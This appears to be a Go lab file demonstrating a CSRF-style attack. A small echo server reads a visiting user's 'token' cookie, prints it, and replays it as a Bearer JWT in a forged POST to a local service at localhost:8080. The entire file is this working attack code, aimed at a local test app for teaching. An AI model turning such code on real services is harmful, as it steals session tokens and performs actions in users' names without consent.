package csrf

import (
	"fmt"
	"io"
	"log"
	"net/http"
	"net/url"
	"os"
	"strings"

	"github.com/k0kubun/pp"
	"github.com/labstack/echo"
)

func Run() error {
	e := echo.New()
	e.GET("/", CSRF)

	return e.Start(":8081")
}

func CSRF(c echo.Context) error {
	// ログイン済みのユーザーが送信してきたリクエストを取得
	_req := c.Request()

	// Cookie を取得
	cookie, err := _req.Cookie("token")
	if err != nil {
		log.Println(err.Error())
		return c.String(500, err.Error())
	}

	token := cookie.Value
	// you can see cookie
	pp.Println(token)

	// 新しく生成するリクエストのパラメータをセット
	values := url.Values{}
	values.Set("title", "complete csrf!!")

	// 正規サービスへのポストのためのリクエストを作成3
	req, err := http.NewRequest(
		"POST",
		"http://localhost:8080/users/post",
		strings.NewReader(values.Encode()),
	)

	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	// Cookie から取得した jwt を再利用
	req.Header.Add("Authorization", fmt.Sprintf("Bearer %s", token))
	if err != nil {
		log.Println(err.Error())
		return c.String(500, err.Error())
	}

	client := new(http.Client)
	resp, err := client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	// ポスト結果の表示
	fmt.Print("Received msg: ")
	io.Copy(os.Stderr, resp.Body)
	fmt.Println()

	return c.String(200, "csrf success")
}
